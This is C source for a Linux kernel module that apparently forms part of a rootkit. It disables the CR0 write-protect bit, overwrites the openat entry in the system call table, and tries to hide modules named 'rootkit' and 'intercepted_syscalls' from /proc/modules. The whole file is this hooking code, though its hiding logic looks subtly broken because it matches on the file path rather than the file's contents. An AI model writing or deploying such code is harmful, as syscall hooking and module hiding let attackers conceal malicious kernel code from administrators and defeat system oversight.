#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/special_insns.h>
#include <asm/processor-flags.h>
#include <asm/unistd.h>
#include <linux/seq_file.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/slab.h>

#ifdef pr_fmt
#undef pr_fmt
#endif
#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
static char *modules_to_skip[] = {
    "rootkit",
    "intercepted_syscalls",
};
typedef long (*sys_call_ptr_t)(const struct pt_regs *);

static sys_call_ptr_t *real_sys_call_table;
static sys_call_ptr_t original_openat;

static unsigned long sys_call_table_addr;
module_param(sys_call_table_addr, ulong, 0);
MODULE_PARM_DESC(sys_call_table_addr, "Address of sys_call_table");

// Since Linux v5.3, [native_]write_cr0 won't change "sensitive" CR0 bits.
static void write_cr0_unsafe(unsigned long val)
{
    asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
}

static long my_openat(const struct pt_regs *regs)
{
    long ret = original_openat(regs);

    char __user *filename = (char __user *)regs->si;
    char buf[256];

    if (copy_from_user(buf, filename, sizeof(buf)) == 0) {
        // Extract the file name from the path
        char *file_name = strrchr(buf, '/');
        if (file_name) {
            file_name++; // Move to the actual file name
            if (strcmp(file_name, "modules") == 0) {
                // Check if the file name is "modules"
                // You can skip or modify the code here to exclude certain modules
                int i;
                for (i = 0; i < ARRAY_SIZE(modules_to_skip); i++) {
                    if (strstr(buf, modules_to_skip[i]) != NULL) {
                        // Skip opening the file for the specified modules
                        printk(KERN_INFO "Skipping open for /proc/modules for module: %s\n", modules_to_skip[i]);
                        return -ENOENT;
                    }
                }
            }
        }
    }

    return ret;
}


static int __init modinit(void)
{
    unsigned long old_cr0;
    real_sys_call_table = (typeof(real_sys_call_table))sys_call_table_addr;

    pr_info("init\n");

    old_cr0 = read_cr0();
    write_cr0_unsafe(old_cr0 & ~(X86_CR0_WP));
    
    original_openat = real_sys_call_table[__NR_openat];
    real_sys_call_table[__NR_openat] = my_openat;
    
    write_cr0_unsafe(old_cr0);
    pr_info("init done\n");

    return 0;
}

static void __exit modexit(void)
{
    unsigned long old_cr0;
  
    pr_info("exit\n");

    old_cr0 = read_cr0();
    write_cr0_unsafe(old_cr0 & ~(X86_CR0_WP));
    real_sys_call_table[__NR_openat] = original_openat;
    write_cr0_unsafe(old_cr0);

    pr_info("goodbye\n");
}

module_init(modinit);
module_exit(modexit);

MODULE_VERSION("0.1");
MODULE_DESCRIPTION("Intercept openat syscall for /proc/modules");
MODULE_AUTHOR("Your Name");
MODULE_LICENSE("GPL");
